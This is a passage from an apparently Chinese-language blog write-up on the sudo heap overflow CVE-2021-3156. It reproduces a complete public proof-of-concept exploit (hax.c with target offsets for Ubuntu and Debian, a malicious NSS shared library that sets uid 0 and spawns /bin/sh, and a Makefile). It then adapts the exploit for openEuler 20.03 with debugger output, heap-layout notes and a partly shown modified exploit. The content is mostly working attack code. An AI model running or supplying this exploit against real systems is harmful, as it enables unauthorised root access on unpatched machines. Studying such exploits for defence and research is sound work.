class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//hax.c</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> ** CVE-2021-3156 PoC by blasty &lt;peter@haxx.in&gt;</span></span><br><span class="line"><span class="comment"> ** ===========================================</span></span><br><span class="line"><span class="comment"> **</span></span><br><span class="line"><span class="comment"> ** Exploit for that sudo heap overflow thing everyone is talking about.</span></span><br><span class="line"><span class="comment"> ** This one aims for singleshot. Does not fuck with your system files.</span></span><br><span class="line"><span class="comment"> ** No warranties.</span></span><br><span class="line"><span class="comment"> **</span></span><br><span class="line"><span class="comment"> ** Shout outs to:</span></span><br><span class="line"><span class="comment"> **   Qualys      - for pumping out the awesome bugs</span></span><br><span class="line"><span class="comment"> **   lockedbyte  - for coop hax. (shared tmux gdb sessions ftw)</span></span><br><span class="line"><span class="comment"> **   dsc         - for letting me rack up his electricity bill</span></span><br><span class="line"><span class="comment"> **   my wife     - for all the quality time we had to skip</span></span><br><span class="line"><span class="comment"> **</span></span><br><span class="line"><span class="comment"> **  Enjoy!</span></span><br><span class="line"><span class="comment"> **</span></span><br><span class="line"><span class="comment"> **   -- blasty // 20210130</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 512 environment variables should be enough for everyone</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_ENVP 512</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"><span class="type">char</span> *target_name;</span><br><span class="line"><span class="type">char</span> *sudoedit_path;</span><br><span class="line"><span class="type">uint32_t</span> smash_len_a;</span><br><span class="line"><span class="type">uint32_t</span> smash_len_b;</span><br><span class="line"><span class="type">uint32_t</span> null_stomp_len;</span><br><span class="line"><span class="type">uint32_t</span> lc_all_len;</span><br><span class="line">&#125; <span class="type">target_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">target_t</span> targets[] = &#123;</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// Yes, same values as 20.04.1, but also confirmed.</span></span><br><span class="line">        .target_name    = <span class="string">&quot;Ubuntu 18.04.5 (Bionic Beaver) - sudo 1.8.21, libc-2.27&quot;</span>,</span><br><span class="line">        .sudoedit_path  = <span class="string">&quot;/usr/bin/sudoedit&quot;</span>,</span><br><span class="line">        .smash_len_a    = <span class="number">56</span>,</span><br><span class="line">        .smash_len_b    = <span class="number">54</span>,</span><br><span class="line">        .null_stomp_len = <span class="number">63</span>,</span><br><span class="line">        .lc_all_len     = <span class="number">212</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        .target_name    = <span class="string">&quot;Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31&quot;</span>,</span><br><span class="line">        .sudoedit_path  = <span class="string">&quot;/usr/bin/sudoedit&quot;</span>,</span><br><span class="line">        .smash_len_a    = <span class="number">56</span>,</span><br><span class="line">        .smash_len_b    = <span class="number">54</span>,</span><br><span class="line">        .null_stomp_len = <span class="number">63</span>,</span><br><span class="line">        .lc_all_len     = <span class="number">212</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        .target_name    = <span class="string">&quot;Debian 10.0 (Buster) - sudo 1.8.27, libc-2.28&quot;</span>,</span><br><span class="line">        .sudoedit_path  = <span class="string">&quot;/usr/bin/sudoedit&quot;</span>,</span><br><span class="line">        .smash_len_a    = <span class="number">64</span>,</span><br><span class="line">        .smash_len_b    = <span class="number">49</span>,</span><br><span class="line">        .null_stomp_len = <span class="number">60</span>,</span><br><span class="line">        .lc_all_len     = <span class="number">214</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">usage</span><span class="params">(<span class="type">char</span> *prog)</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;  usage: %s &lt;target&gt;\\n\\n&quot;</span>, prog);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;  available targets:\\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;  ------------------------------------------------------------\\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(targets) / <span class="keyword">sizeof</span>(<span class="type">target_t</span>); i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;    %d) %s\\n&quot;</span>, i, targets[i].target_name);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;  ------------------------------------------------------------\\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\\n** CVE-2021-3156 PoC by blasty &lt;peter@haxx.in&gt;\\n\\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">2</span>) &#123;</span><br><span class="line">        usage(argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> target_idx = atoi(argv[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (target_idx &lt; <span class="number">0</span> || target_idx &gt;= (<span class="keyword">sizeof</span>(targets) / <span class="keyword">sizeof</span>(<span class="type">target_t</span>))) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;invalid target index\\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">target_t</span> *target = &amp;targets[ target_idx ];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;using target: &#x27;%s&#x27;\\n&quot;</span>, target-&gt;target_name);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *smash_a = <span class="built_in">calloc</span>(target-&gt;smash_len_a + <span class="number">2</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="type">char</span> *smash_b = <span class="built_in">calloc</span>(target-&gt;smash_len_b + <span class="number">2</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(smash_a, <span class="string">&#x27;A&#x27;</span>, target-&gt;smash_len_a);</span><br><span class="line">    <span class="built_in">memset</span>(smash_b, <span class="string">&#x27;B&#x27;</span>, target-&gt;smash_len_b);</span><br><span class="line"></span><br><span class="line">    smash_a[target-&gt;smash_len_a] = <span class="string">&#x27;\\\\&#x27;</span>;</span><br><span class="line">    smash_b[target-&gt;smash_len_b] = <span class="string">&#x27;\\\\&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *s_argv[]=&#123;</span><br><span class="line">        <span class="string">&quot;sudoedit&quot;</span>, <span class="string">&quot;-s&quot;</span>, smash_a, <span class="string">&quot;\\\\&quot;</span>, smash_b, <span class="literal">NULL</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *s_envp[MAX_ENVP];</span><br><span class="line">    <span class="type">int</span> envp_pos = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; target-&gt;null_stomp_len; i++) &#123;</span><br><span class="line">        s_envp[envp_pos++] = <span class="string">&quot;\\\\&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    s_envp[envp_pos++] = <span class="string">&quot;X/P0P_SH3LLZ_&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *lc_all = <span class="built_in">calloc</span>(target-&gt;lc_all_len + <span class="number">16</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(lc_all, <span class="string">&quot;LC_ALL=C.UTF-8@&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(lc_all+<span class="number">15</span>, <span class="string">&#x27;C&#x27;</span>, target-&gt;lc_all_len);</span><br><span class="line"></span><br><span class="line">    s_envp[envp_pos++] = lc_all;</span><br><span class="line">    s_envp[envp_pos++] = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;** pray for your rootshell.. **\\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    execve(target-&gt;sudoedit_path, s_argv, s_envp);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//lib.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> __attribute__ ((constructor)) _init(<span class="type">void</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> _init(<span class="type">void</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] bl1ng bl1ng! We got it!\\n&quot;</span>);</span><br><span class="line">setuid(<span class="number">0</span>); seteuid(<span class="number">0</span>); setgid(<span class="number">0</span>); setegid(<span class="number">0</span>);</span><br><span class="line"><span class="type">static</span> <span class="type">char</span> *a_argv[] = &#123; <span class="string">&quot;sh&quot;</span>, <span class="literal">NULL</span> &#125;;</span><br><span class="line"><span class="type">static</span> <span class="type">char</span> *a_envp[] = &#123; <span class="string">&quot;PATH=/bin:/usr/bin:/sbin&quot;</span>, <span class="literal">NULL</span> &#125;;</span><br><span class="line">execv(<span class="string">&quot;/bin/sh&quot;</span>, a_argv);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">all:</span><br><span class="line">rm -rf libnss_X</span><br><span class="line">mkdir libnss_X</span><br><span class="line">gcc -o sudo-hax-me-a-sandwich hax.c</span><br><span class="line">gcc -fPIC -shared -o <span class="string">&#x27;libnss_X/P0P_SH3LLZ_.so.2&#x27;</span> lib.c</span><br><span class="line">clean:</span><br><span class="line">rm -rf libnss_X sudo-hax-me-a-sandwich</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="For-open-euler-20-03"><a href="#For-open-euler-20-03" class="headerlink" title="For open euler 20.03"></a>For open euler 20.03</h2><p>系统类似于<code>centos</code>，我们看一下<code>/etc/nsswitch.conf</code>即配置文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">passwd:      sss files systemd</span><br><span class="line">shadow:     files sss</span><br><span class="line">group:       sss files systemd</span><br><span class="line"></span><br><span class="line">hosts:      files dns myhostname</span><br><span class="line"></span><br><span class="line">bootparams: files</span><br><span class="line"></span><br><span class="line">ethers:     files</span><br><span class="line">netmasks:   files</span><br><span class="line">networks:   files</span><br><span class="line">protocols:  files</span><br><span class="line">rpc:        files</span><br><span class="line">services:   files sss</span><br><span class="line"></span><br><span class="line">netgroup:   sss</span><br><span class="line"></span><br><span class="line">publickey:  files</span><br><span class="line"></span><br><span class="line">automount:  files sss</span><br><span class="line">aliases:    files</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以看到这里的顺序和服务规范和<code>ubuntu</code>下面不一样，因此这里的堆布局与<code>ubuntu</code>也不相同。我们先看一下系统的调用逻辑是否发生了改变。经过调试发现其调用逻辑与<code>ubuntu</code>下相同</p><p>我们将<code>ni</code>结构体手动修改如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *ni</span><br><span class="line">$4 = &#123;</span><br><span class="line">  next = 0x0,</span><br><span class="line">  actions = &#123;NSS_ACTION_CONTINUE, NSS_ACTION_CONTINUE, NSS_ACTION_CONTINUE, NSS_ACTION_CONTINUE, NSS_ACTION_CONTINUE&#125;,</span><br><span class="line">  library = 0x555555582be0,</span><br><span class="line">  known = 0x555555592b30,</span><br><span class="line">  name = 0x5555555861a0 &quot;X/P0P_SH3LLZ_ &quot;</span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt; p shlib_name</span><br><span class="line">$5 = 0x7fffffffdeb0 &quot;libnss_X/P0P_SH3LLZ_ .so.2&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/CVE-2021-3156-sudo-heap-based-bufoverflow/3.png" alt="图片无法显示，请联系作者" title=" "><p>经过手动修改的<code>ni</code>结构体，这里继续执行就会<code>getshell</code>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line">[+] bl1ng bl1ng! We got it!</span><br><span class="line">process 123212 is executing new program: /usr/bin/bash</span><br><span class="line">Error <span class="keyword">in</span> re-setting breakpoint 2: No <span class="built_in">source</span> file named sudo.c.</span><br><span class="line">Error <span class="keyword">in</span> re-setting breakpoint 3: No <span class="built_in">source</span> file named sudo.c.</span><br><span class="line">Error <span class="keyword">in</span> re-setting breakpoint 4: No <span class="built_in">source</span> file named sudo.c.</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>那么接下来的问题就是如何复习这个结构体了，与<code>ubuntu</code>覆写<code>files service_user</code>不同，这里需要覆写的是<code>sss service_user</code>结构体，但是两者没有本质的区别都是<code>group</code>的第一个结构体，唯一不同的就是分配到<code>group</code>服务规范的结构体之前<code>get_user_info</code>所分配的堆块的数量，我们调试一下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">malloc</span>(<span class="number">0x100</span>)</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x400</span>)</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x228</span>) <span class="comment">// tcache</span></span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x10</span>)</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x78</span>)<span class="comment">// 目标0x80堆块</span></span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x1000</span>)</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x17</span>) <span class="comment">// 开始为passwd分配service_user // tcache</span></span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x34</span>)</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x36</span>)</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x38</span>)</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x17</span>) <span class="comment">// 开始为shadow分配service_user</span></span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x36</span>)</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x34</span>)</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x16</span>)<span class="comment">// 开始为group分配service_user</span></span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x34</span>)<span class="comment">// 这里就是sss service_user的结构体</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里我们需要提前布置<code>6</code>个<code>0x40</code>大小的堆块，和一个<code>0xc0</code>大小的堆块（这里布置<code>0x80</code>的堆块不合适，因为之后会被申请并更换为高地址的<code>0x80</code>堆块，经过测试<code>0xc0</code>大小的堆块可以。）</p><h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> ** CVE-2021-3156 PoC by blasty &lt;peter@haxx.in&gt;</span></span><br><span class="line"><span class="comment"> ** ===========================================</span></span><br><span class="line"><span class="comment"> **</span></span><br><span class="line"><span class="comment"> ** Exploit for that sudo heap overflow thing everyone is talking about.</span></span><br><span class="line"><span class="comment"> ** This one aims for singleshot. Does not fuck with your system files.</span></span><br><span class="line"><span class="comment"> ** No warranties.</span></span><br><span class="line"><span class="comment"> **</span></span><br><span class="line"><span class="comment"> ** Shout outs to:</span></span><br><span class="line"><span class="comment"> **   Qualys      - for pumping out the awesome bugs</span></span><br><span class="line"><span class="comment"> **   lockedbyte  - for coop hax. (shared tmux gdb sessions ftw)</span></span><br><span class="line"><span class="comment"> **   dsc         - for letting me rack up his electricity bill</span></span><br><span class="line"><span class="comment"> **   my wife     - for all the quality time we had to skip</span></span><br><span class="line"><span class="comment"> **</span></span><br><span class="line"><span class="comment"> **  Enjoy!</span></span><br><span class="line"><span class="comment"> **</span></span><br><span class="line"><span class="comment"> **   -- blasty // 20210130</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 512 environment variables should be enough for everyone</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_ENVP 0x1000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"><span class="type">char</span> *target_name;</span><br><span class="line"><span class="type">char</span> *sudoedit_path;</span><br><span class="line"><span class="type">uint32_t</span> smash_len_a;</span><br><span class="line"><span class="type">uint32_t</span> smash_len_b;</span><br><span class="line"><span class="type">uint32_t</span> null_stomp_len;</span><br><span class="line"><span class="type">uint32_t</span> lc_all_len;</span><br><span class="line">&#125; <span class="type">target_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *lc_names[]=&#123;</span><br><span class="line">        <span class="string">&quot;LC_COLLATE&quot;</span>,</span><br><span class="line">        <span class="string">&quot;LC_CTYPE&quot;</span>,</span><br><span class="line">        <span class="string">&quot;LC_MONETARY&quot;</span>,</span><br><span class="line">        <span class="string">&quot;LC_NUMERIC&quot;</span>,</span><br><span class="line">        <span class="string">&quot;LC_TIME&quot;</span>,</span><br><span class="line">        <span class="string">&quot;LC_MESSAGES&quot;</span>,</span><br><span class="line">        <span class="string">&quot;LC_PAPER&quot;</span>,</span><br><span class="line">        <span class="string">&quot;LC_NAME&quot;</span>,</span><br><span class="line">        <span class="string">&quot;LC_ADDRESS&quot;</span>,</span><br><span class="line">        <span class="string">&quot;LC_TELEPHONE&quot;</span>,</span><br><span class="line">        <span class="string">&quot;LC_MEASUREMENT&quot;</span>,</span><br><span class="line">        <span class="string">&quot;LC_IDENTIFICATION&quot;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">target_t</span> targets[] = &#123;</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// Yes, same values as 20.04.1, but also confirmed.</span></span><br><span class="line">        .target_name    = <span class="string">&quot;Ubuntu 18.04.5 (Bionic Beaver) - sudo 1.8.21, libc-2.27&quot;</span>,</span><br><span class="line">        .sudoedit_path  = <span class="string">&quot;/usr/bin/sudoedit&quot;</span>,</span><br><span class="line">        .smash_len_a    = <span class="number">0x53</span>,</span><br><span class="line">        .smash_len_b    = <span 